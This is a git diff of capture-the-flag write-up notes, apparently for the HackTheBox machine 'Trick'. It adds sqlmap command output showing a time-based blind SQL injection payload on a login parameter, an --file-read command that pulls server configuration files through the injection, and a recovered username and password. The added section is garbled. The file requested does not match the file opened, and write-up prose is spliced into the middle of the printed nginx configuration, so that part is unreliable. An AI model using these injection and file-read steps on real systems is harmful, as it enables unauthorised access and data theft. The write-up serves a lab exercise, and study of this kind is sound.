@@ -1,13 +1,13 @@
 
-| Property         | Value                         |
-| ---------------- | ----------------------------- |
-| **OS**           | Linux / Windows               |
-| **Difficulty**   | Easy / Medium / Hard / Insane |
-| **Release Date** | YYYY-MM-DD                    |
-| **State**        | YYYY-MM-DD                    |
-| **IP**           | 10.10.10.X                    |
-| **Techniques**   | technique-1, technique-2      |
-| **Tags**         | #web #privesc #linux          |
+| Property         | Value                    |
+| ---------------- | ------------------------ |
+| **OS**           | Linux                    |
+| **Difficulty**   | Easy                     |
+| **Release Date** | 18th June, 2022          |
+| **State**        | YYYY-MM-DD               |
+| **IP**           | 10.10.10.X               |
+| **Techniques**   | technique-1, technique-2 |
+| **Tags**         | #web #privesc #linux     |
 
 ---
 ## Summary
@@ -320,7 +320,7 @@ Table: users
                                                     
 ```
 
-Enemigosss:SuperGucciRainbowCake
+Enemigosss:SuperGucciRainbowCake (useless)
 
 ```
  sqlmap -r req.txt --privilege                        
@@ -372,6 +372,89 @@ database management system users privileges:
 [*] ending @ 17:09:24 /2026-09-17/
 
 
+```
+
+```
+sqlmap -r req.txt --file-read="/etc/nginx/nginx.conf" --batch              
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[']_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:34:32 /2026-09-18/
+
+[09:34:32] [INFO] parsing HTTP request from 'req.txt'
+[09:34:32] [INFO] resuming back-end DBMS 'mysql' 
+[09:34:32] [INFO] testing connection to the target URL
+[09:35:02] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[09:35:02] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=t' AND (SELECT 8901 FROM (SELECT(SLEEP(5)))nlQl) AND 'gKti'='gKti&password=t
+---
+[09:35:03] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[09:35:03] [INFO] fingerprinting the back-end DBMS operating system
+[09:35:03] [INFO] the back-end DBMS operating system is Linux
+[09:35:03] [INFO] fetching file: '/etc/nginx/nginx.conf'
+[09:35:03] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+[09:35:23] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[09:35:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[09:35:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[09:35:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+[09:35:40] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 09:35:40 /2026-09-18/
+
+```
+
+```
+cat /home/kali/.local/share/sqlmap/output/preprod-
+payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+```
+
+```
+server {
+listen 80;
+listen [::]:80;
+server_name preprod-marketing.trick.htb;
+In the configuration file we see a new vHost called preprod-marketing.trick.htb . Let's add this to our
+hosts file as well.
+Marketing
+Having added the new domain to our hosts file we can visit the website.
+root /var/www/market;
+index index.php;
+location / {
+try_files $uri $uri/ =404;
+}
+location ~ \.php$ {
+include snippets/fastcgi-php.conf;
+fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+}
+}
+server {
+listen 80;
+listen [::]:80;
+server_name preprod-payroll.trick.htb;
+root /var/www/payroll;
+index index.php;
+location / {
+try_files $uri $uri/ =404;
+}
+location ~ \.php$ {
+include snippets/fastcgi-php.conf;
+fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+}
+}
 ```
 
 
